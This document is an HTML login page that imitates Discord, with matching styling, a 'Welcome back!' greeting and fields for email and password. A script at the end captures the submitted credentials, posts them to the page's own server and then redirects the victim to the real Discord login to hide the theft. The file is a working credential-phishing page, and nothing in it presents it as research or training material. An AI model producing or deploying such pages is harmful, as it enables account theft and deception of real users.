<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Discord - Login</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;background:#313338}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:#313338;width:480px;padding:32px}.logo{text-align:center;margin-bottom:20px;font-size:30px;font-weight:700;color:white}.title{text-align:center;color:#f2f3f5;font-size:24px;font-weight:600;margin-bottom:8px}.sub{text-align:center;color:#b5bac1;font-size:16px;margin-bottom:20px}input{width:100%;padding:10px;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;color:#dbdee1;font-size:16px;margin-bottom:20px;outline:none}input:focus{border-color:#5865f2}input[type="submit"]{background:#5865f2;color:white;border:none;font-weight:500;cursor:pointer}input[type="submit"]:hover{background:#4752c4}.link{color:#00a8fc;text-decoration:none;font-size:14px}.link:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo">Discord</div><div class="title">Welcome back!</div><div class="sub">We're so excited to see you again!</div><form method="POST"><input type="text"name="username"placeholder="Email or Phone Number"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log In"></form><a href="#"class="link">Forgot your password?</a></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://discord.com/login';});});</script></body></html>
